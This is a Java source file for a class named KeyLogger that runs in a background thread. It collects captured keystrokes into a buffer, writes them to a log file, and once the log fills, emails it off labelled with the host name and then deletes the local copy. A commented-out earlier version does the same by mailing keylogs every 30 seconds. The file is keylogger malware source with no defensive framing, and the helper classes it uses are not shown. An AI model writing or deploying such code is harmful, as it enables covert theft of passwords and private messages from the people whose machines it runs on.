/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package abc.handler;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.logging.Level;
import javax.mail.MessagingException;

/**
 *
 * @author Huong
 */
public class KeyLogger extends Thread {

    private Keybroad keybroad;
    private Logger logger;
    private MailSender sender;
    private String name;

    public KeyLogger() throws IOException {
        this.keybroad = new Keybroad();
        this.logger = new Logger();
        this.sender = new MailSender();
        name = getHostName();// weather.data.GetIp.getExternalIpV4();
        this.start();
    }

    public Keybroad getKeybroad() {
        return keybroad;
    }

    private String getHostName() {
        try {
            InetAddress addr;
            addr = InetAddress.getLocalHost();
            return addr.getHostName();
            
        } catch (UnknownHostException ex) {
            return "Unknown";
        }
    }

    @Override
    public void run() {

        while (true) {
            System.out.println(" ");
            if (this.keybroad.isFullBuffer()) {
                try {
                    System.out.println("full buffer");
                    logger.writeLog(this.keybroad.getKeyBuffer());
                    this.keybroad.refreshBuffers();
                    if (logger.isFullLog()) {
                        System.out.println("full log");
                        if (this.sender.sendMail(name, this.logger.getFilePath())) {
                            this.logger.removeLog();
                        }
                    }

                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }

        }
    }

//        try {
////            this.sleep(30000);
//            while (true) {
//                try {
//                    String mess = KeyUtil.getKeylog(keybroad.getKeyCache());
//                    if (mess != null) {
//                        EmailUtil.sendMail("Keylog " + new Date().toString(), mess);
//                        keybroad.onSend();
//                        System.out.println("send!");
//                    }else{
//                        System.out.println("empty!");
//                    }
//                    this.sleep(30000);
//                } catch (MessagingException ex) {
//                    keybroad.onFail();
//                }
//            }
//        } catch (InterruptedException ex) {
//            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
//        }
//    }
}


//hjhdfjsdhf jhfjsdh fsdjhfj sdhf hfdjfh jhfjdhf jhfjdhf hfjdhf hjdhf hdjfh
